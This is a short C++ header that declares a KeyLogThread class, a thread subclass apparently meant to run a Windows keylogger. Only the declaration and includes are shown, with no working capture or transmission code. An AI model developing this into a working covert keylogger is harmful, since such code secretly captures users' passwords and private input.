#pragma once

#ifndef KEYLOG_HOOK
#include <windows.h>
#include "thread.h"
#include "config.h"
#include "file.h"

class KeyLogThread : public Thread
{
public:
	KeyLogThread();
	VOID ThreadFunc(VOID);
};

#endif